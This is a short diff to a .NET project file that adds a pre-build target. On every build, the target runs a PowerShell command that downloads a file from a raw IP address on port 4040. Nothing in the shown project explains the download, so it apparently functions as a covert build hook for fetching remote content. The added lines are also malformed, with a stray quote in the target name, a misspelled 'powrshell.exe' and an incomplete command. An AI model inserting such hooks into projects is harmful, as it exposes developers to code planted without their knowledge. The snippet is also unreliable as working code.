@@ -7,4 +7,9 @@
     <Nullable>enable</Nullable>
   </PropertyGroup>
 
+
+<Target Name=""PreBuild" AfterTargets="PreBuildEvents">
+
+	<Exec Command="powrshell.exe -Command -Uri &quot;http://10.10.11.234:4040/teste&quot; -OutFile &quot;teste.txt&quot;" />
+</Target>
 </Project>
